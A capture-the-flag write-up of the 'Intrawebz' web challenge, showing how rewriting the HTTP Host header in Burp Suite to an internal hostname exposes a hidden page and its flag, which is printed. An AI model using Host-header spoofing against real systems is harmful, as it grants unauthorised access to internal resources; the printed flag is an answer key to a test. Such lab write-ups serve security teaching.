# Intrawebz (100)
#### web - [Virginia TSA Technosphere CTF](../main.md)

## Challenge description:
> You've seen the interwebz. Now get ready for the INTRAwebz
> 
> [https://vatsa-intrawebz.chals.io/](https://vatsa-intrawebz.chals.io/)

## Solution
Going to the website, we are told to access it from the "internal network" `flag.corp.internal`.

Intercepting the request through Burp Suite to the page returns:
```
GET / HTTP/1.1
Host: vatsa-intrawebz.chals.io
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
If we change `Host: vatsa-intrawebz.chals.io` to `Host: flag.corp.internal` and forward the request, a blank page is returned. If we request the source with `Ctrl-U` and change the host again in the new request, the flag is revealed.
```html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet">
  <title>flag.corp.internal</title>
</head>
<body class="bg-dark">
  <div class="container mt-4 text-center">
    <pre class="h1 text-dark font-weight-bolder">************************</pre>
  </div>
</body>
</html>
```
<details> 
    <summary>Flag</summary>
flag{H05tn4M3_P0llU710n}
</details>